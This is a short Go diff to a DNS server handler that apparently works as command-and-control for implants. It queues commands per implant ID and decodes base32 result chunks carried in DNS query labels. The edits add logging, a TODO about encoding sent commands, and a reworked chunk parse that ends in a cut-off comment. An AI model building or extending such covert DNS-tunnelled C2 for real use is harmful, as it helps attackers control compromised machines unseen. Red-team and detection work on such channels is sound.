@@ -59,6 +59,7 @@ func NewDNSHandler() *DNSHandler {
 
 func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 	q := req.Question[0]
+	log.Printf("Raw Query %s\n", q.Name)
 	normalizedQName := strings.ToLower(q.Name) // add a comment here
 	log.Printf("Query %s\n", normalizedQName)
 	labels := dns.SplitDomainName(normalizedQName)
@@ -88,6 +89,8 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 		// domainLabels := strings.Split(questionName, ".")
 
 		if labels[1] == "cmd" { // implant is requesting command
+			// TODO: we should base32encode sent command as well
+
 			if pendingCmds, ok := h.commands[implantID]; ok {
 				if len(pendingCmds) > 0 {
 					cmd := pendingCmds[0]
@@ -104,7 +107,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 			// RN: this implementation only allows for one result for each implant -> make map of cmdTask ids -> results
 			// TODO: handle chunk-id
 
-			chunk := strings.ToUpper(dns.SplitDomainName(q.Name)[2])
+			chunk := strings.ToUpper(labels[2]) // THIS IS NE
 			// chunk := labels[2]
 			data, err := base32.StdEncoding.DecodeString(chunk)
 			if err != nil {
